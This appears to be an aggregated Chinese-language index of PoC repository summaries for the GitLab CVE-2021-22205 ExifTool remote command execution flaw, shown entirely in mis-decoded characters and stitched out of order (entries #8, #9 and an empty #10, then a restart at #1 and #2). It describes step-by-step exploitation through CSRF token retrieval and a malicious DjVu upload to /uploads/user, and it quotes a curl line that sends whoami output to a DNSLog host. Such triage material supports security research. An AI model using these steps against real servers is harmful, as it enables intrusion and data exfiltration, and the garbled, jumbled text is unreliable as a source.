CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆDjVu æ–‡ä»¶ï¼‰åˆ° GitLab æœåŠ¡å™¨ï¼Œå…¶ä¸­å›¾åƒæ–‡ä»¶çš„å…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ã€‚å½“ GitLab ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§ä¸ºâ€œä¸¥é‡ (CRITICAL)â€ï¼ŒCVSS è¯„åˆ†é«˜è¾¾ 10 åˆ†ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žå½±å“èŒƒå›´å¹¿ä¸”å®¹æ˜“åˆ©ç”¨ã€‚æä¾›çš„ POC ä»£ç  `CVE-2021-22205.py` æ—¨åœ¨åˆ©ç”¨æ­¤æ¼æ´žã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æŸ¥æ‰¾CSRF token:** è„šæœ¬é¦–å…ˆå°è¯•ä»Ž `/users/sign_in` é¡µé¢èŽ·å– CSRF tokenï¼Œå› ä¸ºä¸Šä¼ æ–‡ä»¶éœ€è¦æœ‰æ•ˆçš„ CSRF tokenã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æå– tokenã€‚
2.  **æž„å»ºæ¶æ„DjVuæ–‡ä»¶ä¸Šä¼ è¯·æ±‚:** ç„¶åŽï¼Œè„šæœ¬æž„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DjVu æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ï¼ŒGitLab æœåŠ¡å™¨ä¼šä½¿ç”¨ ExifTool å¤„ç†è¯¥æ–‡ä»¶ã€‚
3.  **è§¦å‘å‘½ä»¤æ‰§è¡Œ:** å½“ ExifTool å¤„ç†è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥åœ¨æ–‡ä»¶å…ƒæ•°æ®ä¸­çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
è™½ç„¶æä¾›çš„ä»£ç çœ‹èµ·æ¥åŠŸèƒ½æ˜Žç¡®ï¼Œä½†å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ã€‚å…·ä½“è¡¨çŽ°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–æ€§é£Žé™©:** è¯¥è„šæœ¬ä¾èµ–äºŽ `requests` æ¨¡å—ã€‚è™½ç„¶è¿™æ˜¯å¾ˆå¸¸è§çš„æ¨¡å—ï¼Œå¦‚æžœä½œè€…ä¿®æ”¹äº†ä»£ç ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä½¿å…¶å®‰è£…äº†æ¶æ„ä¾èµ–ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªæŠ•æ¯’ç‚¹ã€‚
*   **ä»£ç†é…ç½®åˆ©ç”¨:** è„šæœ¬æ”¯æŒé€šè¿‡ä»£ç†æœåŠ¡å™¨è¿žæŽ¥ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æä¾›æ¶æ„çš„ä»£ç†æœåŠ¡å™¨åœ°å€æ¥çªƒå–å—å®³è€…çš„å‡­æ®æˆ–æ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚
*   **å‘½ä»¤æ‰§è¡Œçš„éšè”½æ€§ï¼š** å¦‚æžœä¸Šä¼ çš„payloadåŒ…å«åå¼¹shell, åˆ™è„šæœ¬å¯èƒ½ä¼šå°è¯•å»ºç«‹åå‘ shell è¿žæŽ¥æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œè€Œéš¾ä»¥æ£€æµ‹ã€‚
*   **ç‰ˆæœ¬éªŒè¯ç»•è¿‡:** è„šæœ¬ä¸­çš„ç‰ˆæœ¬éªŒè¯å¯èƒ½å­˜åœ¨ç»•è¿‡çš„é£Žé™©ï¼Œå³ä½¿ç”¨æˆ·ä¿®å¤äº†æ¼æ´žï¼Œè„šæœ¬ä»ç„¶å°è¯•åˆ©ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–æœªçŸ¥çš„å®‰å…¨é—®é¢˜ã€‚

ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£Žé™©çº¦ä¸º 10%ã€‚ä¸»è¦åŽŸå› æ˜¯è¯¥è„šæœ¬çš„åŠŸèƒ½è¾ƒä¸ºé›†ä¸­ï¼Œä¸”ä¾èµ–æ¨¡å—è¾ƒå°‘ã€‚ä½†ä»ç„¶éœ€è¦å¯¹è„šæœ¬è¿›è¡Œä»”ç»†å®¡æŸ¥ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [cc3305/CVE-2021-22205](https://github.com/cc3305/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #8

**æ¥æº**: [CVE-2021-22205-ccordeiro_CVE-2021-22205.md](../2021/CVE-2021-22205-ccordeiro_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®ï¼Œä¸”æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 å­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ `/users/sign_in`ï¼ŒèŽ·å– CSRF tokenã€‚ 
2.  ç„¶åŽï¼Œæ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚è¯¥æ–‡ä»¶ä¸­çš„ metadata å­—æ®µåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ `curl whoami.82sm53.dnslog.cn` æˆ–å…¶ä»–æ¶æ„æŒ‡ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ­¤ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚è¯·æ±‚å¤´ä¸­åŒ…å«ä¹‹å‰èŽ·å–çš„ CSRF tokenã€‚
4.  GitLab åœ¨å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼ŒExifTool ä¼šæ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„PoCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ExifToolå…ƒæ•°æ®ï¼Œå¯ä»¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚PoCä»£ç é¦–å…ˆèŽ·å–CSRF Tokenï¼Œç„¶åŽæž„é€ åŒ…å«payloadçš„multipart/form-dataè¯·æ±‚ï¼Œå‘é€åˆ°`/uploads/user`ç«¯ç‚¹ã€‚å¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žä¸”æœªæ‰“è¡¥ä¸ï¼ŒPoCä¼šæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**
æä¾›çš„PoCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚ç»è¿‡åˆ†æžï¼Œä»£ç ä¸­æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æ¶æ„é€»è¾‘æˆ–åŽé—¨ã€‚ é£Žé™©è¾ƒä½Žï¼Œ ä½†æ˜¯å¹¶ä¸èƒ½æŽ’é™¤ä½œè€…åœ¨ä»£ç ä¸­éšè—äº†ä¸æ˜“å¯Ÿè§‰çš„æŠ•æ¯’ä»£ç ã€‚ä¾‹å¦‚é€šè¿‡ç½‘ç»œåŠ è½½æ¶æ„ä»£ç ç­‰ã€‚æ‰€ä»¥è¿™é‡Œè¯„ä¼°çš„æŠ•æ¯’é£Žé™©ä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [ccordeiro/CVE-2021-22205](https://github.com/ccordeiro/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #9

**æ¥æº**: [CVE-2021-22205-devdanqtuan_CVE-2021-22205.md](../2021/CVE-2021-22205-devdanqtuan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ GitLab å®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—® GitLab å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Tokenï¼Œè¯¥ Token å¯é€šè¿‡è®¿é—®ç™»å½•é¡µé¢èŽ·å¾—ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åˆ©ç”¨ ExifTool çš„æ¼æ´žï¼Œåœ¨è§£æžå…ƒæ•°æ®æ—¶æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab çš„å¤´åƒä¸Šä¼ æŽ¥å£ `/uploads/user`ã€‚
4.  GitLab è°ƒç”¨ ExifTool è§£æžå›¾åƒæ–‡ä»¶ï¼ŒExifTool æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**

æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒæ¨¡æ‹Ÿäº†ä¸Šè¿°åˆ©ç”¨æµç¨‹ï¼Œèƒ½å¤ŸæˆåŠŸè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ã€‚POC é€šè¿‡æž„é€ æ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ï¼Œå°†å‘½ä»¤æ³¨å…¥åˆ° ExifTool å¯ä»¥è§£æžçš„å…ƒæ•°æ®ä¸­ã€‚ä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡åˆ°å­˜åœ¨æ¼æ´žçš„GitLabæœåŠ¡å™¨ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

ä»£ç æ•´ä½“æ˜¯ç”¨äºŽå¤çŽ°æ¼æ´žï¼Œä½†å­˜åœ¨å¾®å°çš„æŠ•æ¯’é£Žé™©ã€‚ä¸»è¦é£Žé™©ç‚¹åœ¨äºŽæ”»å‡»å‘½ä»¤çš„æž„é€ ä»¥åŠæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹`target_url`æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è€ƒè™‘åˆ°POCæœ¬èº«å°±æ˜¯æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ‰€ä»¥æ­£å¸¸ä½¿ç”¨åœºæ™¯ä¸‹æ˜¯æ²¡é—®é¢˜çš„ã€‚é™¤éžï¼Œæœ‰äººæ•…æ„é­”æ”¹æ­¤ä»£ç ï¼Œæˆ–è€…åœ¨æ‰¹é‡æµ‹è¯•æ—¶ï¼Œä½¿ç”¨è€…æœªæ£€æŸ¥urlï¼Œå¯èƒ½ä¼šæœ‰ä¸€å®šé£Žé™©ã€‚æ•…è®¤ä¸ºæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œçº¦ä¸º1%ã€‚

**ä¼˜å…ˆçº§:**

ç”±äºŽæœç´¢å¼•æ“Žæ²¡æœ‰æä¾›ç»“æžœï¼Œå› æ­¤ä¼˜å…ˆçº§ä¸ºæ¼æ´žåˆ©ç”¨ä»£ç  > æ¼æ´žåº“ä¿¡æ¯ã€‚

**é¡¹ç›®åœ°å€:** [devdanqtuan/CVE-2021-22205](https://github.com/devdanqtuan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #10

**æ¥æº**: [CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md](../2021/CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md)

# CVE-2021-22205

> ðŸ“¦ è¯¥CVEæœ‰ **24** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2021-22205-Al1ex_CVE-2021-22205.md](../2021/CVE-2021-22205-Al1ex_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œä¸”ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab å¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ 11.9 åˆ° 13.8.8ï¼Œ13.9 åˆ° 13.9.6 ä»¥åŠ 13.10 åˆ° 13.10.3ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’ŒPOCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç é€šè¿‡æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åµŒå…¥äº†å‘½ä»¤ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾åƒæ—¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚POCä»£ç èƒ½å¤ŸæˆåŠŸåˆ©ç”¨æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

å¯¹POCä»£ç çš„æŠ•æ¯’é£Žé™©åˆ†æžå¦‚ä¸‹ï¼š

*   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žï¼Œç»“æž„æ¸…æ™°ï¼Œç›®çš„æ˜¯æž„é€ æ¶æ„å›¾ç‰‡å¹¶å‘é€è¯·æ±‚ã€‚
*   è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£Žé™©ï¼Œä½†è¿™å±žäºŽæ¼æ´žæœ¬èº«çš„ç‰¹æ€§ï¼Œè€Œéžä½œè€…é¢å¤–æ·»åŠ çš„æ¶æ„ä»£ç ã€‚
*   å…¶ä¸­`curl `whoami`.82sm53.dnslog.cn`åªæ˜¯ä¸€ä¸ªDNSLogæ£€æµ‹ï¼Œç”¨äºŽéªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œå¹¶éžæ¶æ„æŠ•æ¯’ã€‚

è™½ç„¶æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´žæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä½†å°±æä¾›çš„POCä»£ç æœ¬èº«è€Œè¨€ï¼Œä¸å­˜åœ¨æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œå¤§çº¦ä¸º5%ã€‚ä¸»è¦é£Žé™©åœ¨äºŽä½¿ç”¨è¯¥POCè¿›è¡ŒæœªæŽˆæƒçš„æ¸—é€æµ‹è¯•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ï¼ˆ/users/sign_inï¼‰ï¼ŒèŽ·å–CSRF Tokenã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨ExifToolå¤„ç†è¯¥å›¾åƒæ—¶æ‰§è¡Œã€‚`attack` å‡½æ•°ä¸­çš„ä»£ç å…è®¸é€šè¿‡ `-c` å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…é€šè¿‡/uploads/useræŽ¥å£ä¸Šä¼ æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚åŒæ—¶åœ¨POSTè¯·æ±‚ä¸­å¸¦ä¸ŠCSRF Tokenã€‚
4.  å½“GitLabå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šè§£æžè¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚
5.  æ”»å‡»è€…é€šè¿‡DNSLogæˆ–å…¶ä»–æ–¹å¼æ¥æŽ¥æ”¶å‘½ä»¤æ‰§è¡Œçš„ç»“æžœï¼Œæˆ–è€…ç›´æŽ¥åˆ©ç”¨æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [Al1ex/CVE-2021-22205](https://github.com/Al1ex/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #2

**æ¥æº**: [CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md](../2021/CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨ä¸”å¯ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE 11.9 åˆ° 13.10.3 ç‰ˆæœ¬ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ å…·ä½“æ¥è¯´ï¼Œå½“ä¸Šä¼ å›¾åƒæ–‡ä»¶æ—¶ï¼ŒGitLab Workhorse ä¼šå°† jpg|jpeg|tiff æ‰©å±•åçš„æ–‡ä»¶ä¼ é€’ç»™ ExifTool ä»¥åˆ é™¤ä»»ä½•éžç™½åå•çš„æ ‡ç­¾ã€‚ ExifTool å°†å¿½ç•¥æ–‡ä»¶æ‰©å±•åå¹¶å°è¯•æ ¹æ®å†…å®¹ç¡®å®šæ–‡ä»¶ç±»åž‹ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡é‡å‘½åä¸Šä¼ çš„æ–‡ä»¶æ¥è§¦å‘ DjVu è§£æžå™¨ã€‚ DjVu è§£æžå™¨åœ¨è§£æž DjVu æ³¨é‡Šæ—¶ï¼Œä¼šå¯¹ token è¿›è¡Œ eval æ“ä½œä»¥è½¬æ¢ C è½¬ä¹‰åºåˆ—ã€‚è™½ç„¶å­˜åœ¨ä¸€äº›éªŒè¯æ¥ç¡®ä¿æ‰€æœ‰å†…å®¹éƒ½è¢«æ­£ç¡®è½¬ä¹‰ï¼Œä½†æ˜¯åæ–œæ åŽè·Ÿæ¢è¡Œç¬¦å¯ä»¥è¢«æ­£ç¡®å¤„ç†ï¼Œä»Žè€Œå…è®¸å¼•å·è¢«å…³é—­ï¼Œå¹¶æ’å…¥å’Œè¯„ä¼°ä»»æ„ Perl ä»£ç ã€‚

æä¾›çš„ POC ä»£ç  (CVE-2021-22205.nse) æ˜¯ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå®ƒä¸ç›´æŽ¥åˆ©ç”¨è¯¥æ¼æ´žæ‰§è¡Œä»£ç ï¼Œè€Œæ˜¯é€šè¿‡æ£€æŸ¥ç‰¹å®š CSS æ–‡ä»¶çš„å­˜åœ¨æ¥åˆ¤æ–­ç›®æ ‡ GitLab å®žä¾‹æ˜¯å¦ä¸ºæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ã€‚ å®ƒé€šè¿‡å‘é€ HTTP GET è¯·æ±‚åˆ° GitLab å®žä¾‹ï¼Œæ ¹æ®è¿”å›žçš„ CSS æ–‡ä»¶å†…å®¹æ¥ç¡®å®šGitLabçš„ç‰ˆæœ¬,å¦‚æžœç‰ˆæœ¬åœ¨å—å½±å“çš„èŒƒå›´å†…,åˆ™è®¤ä¸ºå­˜åœ¨æ¼æ´žã€‚

åˆ©ç”¨æ–¹å¼ï¼š
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DjVu æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Perl ä»£ç ã€‚
2.  å°†æ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ï¼ˆé€šå¸¸ä½œä¸ºå¤´åƒã€é¡¹ç›®logoæˆ–å…¶ä»–å…è®¸ä¸Šä¼ å›¾åƒçš„å­—æ®µï¼‰ã€‚
3.  GitLab Workhorse å°†æ–‡ä»¶ä¼ é€’ç»™ ExifTool è¿›è¡Œå¤„ç†ã€‚
4.  ExifTool è¯†åˆ«å‡º DjVu æ ¼å¼å¹¶è°ƒç”¨ç›¸åº”çš„è§£æžå™¨ã€‚
5.  æ¶æ„ Perl ä»£ç è¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æŠ•æ¯’é£Žé™©è¯„ä¼°ï¼š
è¯¥ Nmap è„šæœ¬çš„ä¸»è¦ç›®çš„æ˜¯æ£€æµ‹æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œè€Œä¸æ˜¯åˆ©ç”¨è¯¥æ¼æ´žã€‚ ä»£ç ä¸­æ²¡æœ‰å‘çŽ°ä»»ä½•å°è¯•æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å‘ç›®æ ‡ç³»ç»Ÿæ¤å…¥åŽé—¨çš„è¿¹è±¡ã€‚ å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Ž (0%)ã€‚


**é¡¹ç›®åœ°å€:** [DIVD-NL/GitLab-cve-2021-22205-nse](https://github.com/DIVD-NL/GitLab-cve-2021-22205-nse)

